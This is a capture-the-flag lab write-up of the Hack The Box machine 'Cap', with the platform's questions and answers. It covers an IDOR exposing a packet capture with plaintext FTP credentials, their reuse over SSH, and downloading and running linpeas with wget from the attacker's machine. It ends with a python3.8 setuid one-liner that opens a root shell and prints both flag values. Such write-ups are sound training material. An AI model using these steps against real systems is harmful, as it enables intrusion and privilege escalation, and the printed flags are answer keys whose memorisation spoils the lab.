# Cap

## Introduction

An Easy difficulty machine focused on an HTTP server performing administrative functions including network captures. An Insecure Direct Object Reference (IDOR) is used to access another user's network capture, which contains plaintext credentials.

## Process

### Cap
We are given an IP Address, so I start by running an nmap scan of the target: `sudo nmap -sV -sC -oA Cap [Target IP] -p-`

<img width="763" height="328" alt="Pasted image 20261104193653" src="https://github.com/user-attachments/assets/7934bc54-26cb-4987-81ff-7f6dc6ebfb0c" />

**How many TCP ports are open?**
> 3

From these open services, the HTTP server looks most interesting, since I could not find any significant vulnerabilities in the FTP and SSH ports.

Visiting the HTTP page shows us a dashboard:

<img width="884" height="724" alt="Pasted image 20261104194618" src="https://github.com/user-attachments/assets/0c00f3df-81ee-4c76-8ae4-42ef178a743d" />

In the menu at the top left, there are four entries in the Dashboard menu:
- Dashboard
- Security Snapshot (5 Second PCAP + Analysis)
- IP Config
- Network Status

The IP Config and Network Status endpoints just give the results of `ifconfig` and `netstat -a` respectively.

Investigating the Security Snapshot (5 Second PCAP + Analysis) endpoint, we see the URL is `http://[Target IP]/data/1`, which looks like some kind of indexing. 

**After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?**
> data

We can try changing the 1 to another value to see what it returns.

<img width="889" height="803" alt="Pasted image 20261104200152" src="https://github.com/user-attachments/assets/73147a5c-c98c-47db-9ae1-ff6914dff3bf" />

**Are you able to get to other users' scans?**
> yes

Changing the value from 1 to 0 gives us another Packet Capture result, with some actual entries, so we can download it and check it out.

<img width="885" height="767" alt="Pasted image 20261104200308" src="https://github.com/user-attachments/assets/0939cc0e-bb18-4638-a6ef-cfa607c69dbd" />

**What is the ID of the PCAP file that contains sensitive data?**
> 0

The file we get is 0.pcap, so we open the PCAP file with Wireshark.

<img width="1739" height="580" alt="Pasted image 20261104201012" src="https://github.com/user-attachments/assets/0e057875-e8ac-4fed-8562-7a5d586a15b8" />

There aren't many packets here, so looking through it's pretty easy to spot USER and PASS being passed in plaintext. Maybe we can use this on the website.

**Which application layer protocol in the pcap file can the sensitive data be found in?**
> ftp

Trying to log out on the website doesn't work, the log out button adds `#` to the end of the page we are on but changes nothing about who is logged in.

The next place to try is the SSH port that we found open earlier. There, the login works!

**We've managed to collect nathan's FTP password. On what other service does this password work?**
> ssh

<img width="666" height="730" alt="Pasted image 20261104201652" src="https://github.com/user-attachments/assets/604c67fc-4165-4360-9039-e3695b038116" />

Here, there is one file, `user.txt`, that has the user flag in it.

**Submit the flag located in the nathan user's home directory**
> fd0859c348826920cc52d76e08d262a7

From here I wasn't sure how to escalate to root, so I got to learn how to use `linpeas`.

We first go to the `/usr/share/peass/linpeas` folder, and start `python3 -m http.server 8000`. This serves an HTTP server on port 8000 of the Kali machine. We then run `wget [Kali IP on HTB VPN]:8000/linpeas.sh`, run `chmod +x linpeas.sh` on the target machine, and then we can execute the script with `./linpeas.sh`.

In the `linpeas.sh` output, we can see one file identified as a Process with capability sets (non-zero CapEff/CapAmb, limit 40) (T1548.001)

<img width="732" height="170" alt="Pasted image 20261104211424" src="https://github.com/user-attachments/assets/0249ef4b-c5d6-466f-bf5a-d7cea7b38c52" />

**What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?**
> /usr/bin/python3.8

Now to root the machine. Searching for `python3.8 T1548.001` leads me to information about abusing SetUID and SetGID permissions for python, allowing us to create a root shell with `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`.

<img width="622" height="35" alt="Pasted image 20261104212215" src="https://github.com/user-attachments/assets/78a88bf8-f831-448d-81a0-eba953d812ae" />

Now that we are root, we just navigate to `/root` and print the root flag with `cat root.txt`

**Submit the flag located in root's home directory.**
> 1645d1313fbfa9d31086b9b53cceea5b

## Conclusion and Learning Outcomes
This box introduced me to PEASS (Privilege Escalation Awesome Scripts SUITE), which I am a big fan of. Especially since they have Windows scripts too, this gives me somewhere to start when looking to see what I can use to escalate privilege after I have a user level remote shell.
